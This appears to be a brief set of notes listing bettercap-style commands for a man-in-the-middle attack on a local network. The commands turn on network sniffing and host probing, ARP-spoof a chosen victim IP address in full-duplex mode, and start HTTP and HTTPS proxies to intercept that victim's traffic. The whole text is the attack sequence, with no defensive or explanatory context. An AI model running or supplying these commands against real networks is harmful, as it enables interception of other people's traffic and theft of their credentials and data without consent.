`net.sniff on`

`net.probe on`

`net.show`

`set arp.spoof.fullduplex true` (be carefull)

`set arp.spoof.targets <victime_IP_address>`

`arp.spoof on`

`http.proxy on`

`https.proxy on`